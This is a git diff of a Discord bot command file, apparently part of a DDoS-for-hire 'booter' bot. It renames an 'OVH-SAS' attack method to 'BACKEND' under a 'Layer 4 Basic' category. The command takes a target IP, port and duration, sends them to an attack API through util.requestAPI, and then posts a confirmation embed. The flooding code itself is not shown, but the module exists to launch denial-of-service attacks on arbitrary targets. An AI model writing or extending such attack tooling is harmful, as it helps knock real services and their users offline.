@@ -1,11 +1,11 @@
 const { MessageEmbed } = require('discord.js');
+const ee = require("../../config.json");
 const Util = require('../../Util/index');
-const ee = require("../../config.json")
 const util = new Util.default;
 module.exports = {
-  name: 'ovh-sas',
-  category: '☄️ | OVH Methods',
-  description: 'start an OVH-SAS attack',
+  name: 'backend',
+  category: '⚡ | Layer 4 Basic',
+  description: 'start an BACKEND attack',
 
   /**
    * @param {Client} client
@@ -90,7 +90,7 @@ module.exports = {
         await message.delete()
 
         /* sends the attack with embed */
-        await util.requestAPI('OVH-SAS', address, port, time);
+        await util.requestAPI('BACKEND', address, port, time);
         return message.channel.send(new MessageEmbed()
           .setThumbnail(client.user.displayAvatarURL())
           .setColor(ee.color)
@@ -98,7 +98,7 @@ module.exports = {
             `> ❯ IP: **${address}**`,
             `> ❯ Port: **${port}**`,
             `> ❯ Time: **${time}**`,
-            `> ❯ Method: **OVH-SAS**`
+            `> ❯ Method: **BACKEND**`
           ])
           .setFooter(message.author.tag, message.member.user.displayAvatarURL())
           .setTimestamp()
